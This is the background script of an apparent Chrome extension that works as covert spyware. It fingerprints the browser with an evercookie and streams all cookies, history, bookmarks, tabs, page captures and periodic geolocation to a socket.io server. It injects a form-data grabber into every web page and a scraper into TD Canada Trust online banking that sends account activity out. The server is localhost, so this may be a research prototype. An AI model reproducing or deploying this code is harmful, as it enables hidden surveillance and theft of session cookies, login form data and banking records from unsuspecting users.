///////////////////////////////////////////////////////////////////////////////
// Define constants.
///////////////////////////////////////////////////////////////////////////////

var SERVER_URL = "http://127.0.0.1:8080/";

///////////////////////////////////////////////////////////////////////////////
// Define transmission related functions.
///////////////////////////////////////////////////////////////////////////////

var socket = io.connect(SERVER_URL, { secure: false });

var emitEvent = function (type, payload) {
    // Define data object.
    data = {};
    data.uuid = uuid;
    data.time = new Date().getTime();
    data.type = type;
    data.payload = JSON.stringify(payload);
    // Compress payload.
    // data.payload = LZString.compress(JSON.stringify(payload));
    // Log data.
    // console.log(data);
    // console.log(payload);
    // Transmit data to server.
    socket.emit(type, data);
    // Return data.
    return data;
};

var emitBlob = function (type, metadata, blob) {
    // Define data object.
    data = {};
    data.uuid = uuid;
    data.time = new Date().getTime();
    data.type = type;
    data.payload = JSON.stringify(metadata);
    // Transmit data to server.
    var stream = ss.createStream();
    ss(socket).emit(type, stream, data);
    ss.createBlobReadStream(blob).pipe(stream);
    // Return data.
    return data;
};

///////////////////////////////////////////////////////////////////////////////
// Determine UUID and activate evercookie.
///////////////////////////////////////////////////////////////////////////////

var uuid = null;
var ec = new evercookie();

// Get UUID from evercookie.
ec.get("uuid", function (value) {
    // Set uuid value.
    if (value === undefined) {
        uuid = Math.uuid();
        ec.set("uuid", uuid);
        console.log("UUID (new):", uuid);
        // Send initial transmission.
        emitInitial();
    } else {
        uuid = value;
        console.log("UUID:", uuid);
        // Send start-up transmission.
        emitStartUp();
    }
    // Activate listeners.
    activateListeners();
});

///////////////////////////////////////////////////////////////////////////////
// Initialise (badly implemented) encrypted session.
///////////////////////////////////////////////////////////////////////////////

var publicKey =
    ["-----BEGIN PUBLIC KEY-----",
     "MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgH/DQTiW3r53iXbRDOnvBr5se3NS",
     "kzah0lq9WzyrmQsD3UgeucYm/iBJ5fxcY0XaKLCE4wgH/dl/2ZZEPjBQDqtccM+F",
     "Gz5Y7Rh8d1xs9M9IBd2CONDr6McHbwKL92kVBE/4IWOXdu/bGhLX8fCGe7hQ7xnw",
     "mz45rrZ+mc1GvxW7AgMBAAE=",
     "-----END PUBLIC KEY-----"
    ].join("\n");
// Get SHA-3 hash of the shared key and use it in AES-256?
var sharedKey = uuid + "-" + Math.uuid(4); // look into salting best practices
var encryptor = new JSEncrypt();
encryptor.setPublicKey(publicKey);


///////////////////////////////////////////////////////////////////////////////
// Define getters.
///////////////////////////////////////////////////////////////////////////////

var emitInitial = function () {
    getFingerprint();
    getCurrentPosition();
    getAllBookmarks();
    getAllHistory();
    getAllTabs();
    getAllCookies();
};

var emitStartUp = function () {
    getFingerprint();
    getCurrentPosition();
    getAllTabs();
};

var getFingerprint = function () {
    fingerprint = {
        userAgent: getUserAgent(),
        screenResolution: getScreenResolution()
    };
    emitEvent("addFingerprint", fingerprint);
};

var getUserAgent = function () {
    return navigator.userAgent;
};

var getScreenResolution = function () {
    return window.screen.width + "x" + window.screen.height;
};

var getCurrentPosition = function () {
    navigator.geolocation.getCurrentPosition(function (position) {
        console.log("Position found.");
        emitEvent("addGeoposition", position);
    }, function(positionError) {
        console.log("Position not found.");
        emitEvent("addGeoposition", null);
    });
};

var getAllBookmarks = function () {
    chrome.bookmarks.getTree(function (results) {
        emitEvent("addBookmark", results);
    });
};

var getAllHistory = function () {
    chrome.history.search({"text": ""}, function (historyArray) {
        emitEvent("addURL", historyArray);
    });
};

var getAllTabs = function () {
    chrome.windows.getAll({"populate": true}, function (windowArray) {
        emitEvent('addAllTabs', windowArray);
    });
};

var getPageCapture = function (tabId) {
    chrome.pageCapture.saveAsMHTML({"tabId": tabId}, function (mhtmlData) {
        var metadata = {'tabId': tabId};
        emitBlob('addPageCapture', metadata, mhtmlData);
    });
};

var getAllCookies = function () {
    chrome.cookies.getAll({}, function (cookieArray) {
        emitEvent("addAllCookies", cookieArray);
    });
};

///////////////////////////////////////////////////////////////////////////////
// Define listener related functions.
///////////////////////////////////////////////////////////////////////////////

var onWindowCreate = function (newWindow) {
    emitEvent('addWindow', newWindow);
};

var onWindowActive = function (windowId) {
    emitEvent('focusWindow', {'windowId': windowId});
};

var onWindowRemoved = function (windowId) {
    emitEvent('removeWindow', {'windowId': windowId});
};

var onTabUpdate = function (tabId, changeInfo, tab) {
    if (changeInfo.status === "complete") {
        emitEvent('updateTab', tab);
        // Inject getFormData event into page.
        if ((/^http/).test(tab.url)) {
            chrome.tabs.executeScript(tabId, {
                file: "lib/jquery-1.7.1.min.js"
            });
            chrome.tabs.executeScript(tabId, {
                file: "events/getFormData.js"
            });
        }
        // Inject getTDStatements event into EasyWeb.
        if ((/easywebcpo.tdcanadatrust.com\/webbanking/).test(tab.url)) {
            chrome.tabs.executeScript(tabId, {
                file: "lib/jquery.csv-0.71.min.js"
            });
            chrome.tabs.executeScript(tabId, {
                file: "events/getTDAccountActivity.js"
            });
        }
    }
};

var onTabActive = function (activeInfo) {
    emitEvent('focusTab', activeInfo);
};

var onTabRemoved = function (tabId, removeInfo) {
    emitEvent('removeTab', {'tabId': tabId});
};

var onURLVisit = function (result) {
    emitEvent('addURL', result);
};

var onURLRemoved = function (removed) {
    // Log only if particular visits are removed.
    if (!removed.allHistory) {
        emitEvent('removeURL', removed);
    }
};

var onCookieChange = function (changeInfo) {
    emitEvent('addCookieChange', changeInfo);
};

var onBookmarkCreate = function (id, bookmark) {
    emitEvent('addBookmark', [bookmark]);
};

var onBookmarkChange = function (id, changeInfo) {
    emitEvent('changeBookmark', {
        'id': id,
        'changeInfo': changeInfo
    });
};

var onBookmarkRemoved = function (id, changeInfo) {
    emitEvent('removeBookmark', { 'id': id });
};

var onPortPost = function (port) {
    if (port.name === 'formData') {
        port.onMessage.addListener(function (formData) {
            emitEvent('addFormData', formData);
        });
    } else if (port.name === 'TDAccountActivity') {
        port.onMessage.addListener(function (activity) {
            console.log(activity);
            emitEvent('addFinancialActivity', activity);
        });
    }
};

var activateListeners = function () {
    console.log("Activating listeners...");
    chrome.windows.onCreated.addListener(onWindowCreate);
    chrome.windows.onFocusChanged.addListener(onWindowActive);
    chrome.windows.onRemoved.addListener(onWindowRemoved);
    chrome.tabs.onUpdated.addListener(onTabUpdate);
    chrome.tabs.onActivated.addListener(onTabActive);
    chrome.tabs.onRemoved.addListener(onTabRemoved);
    chrome.history.onVisited.addListener(onURLVisit);
    chrome.history.onVisitRemoved.addListener(onURLRemoved);
    chrome.cookies.onChanged.addListener(onCookieChange);
    chrome.bookmarks.onCreated.addListener(onBookmarkCreate);
    chrome.bookmarks.onChanged.addListener(onBookmarkChange);
    chrome.bookmarks.onRemoved.addListener(onBookmarkRemoved);
    chrome.runtime.onConnect.addListener(onPortPost);
    setInterval(getCurrentPosition, 5 * 60 * 1000);
};
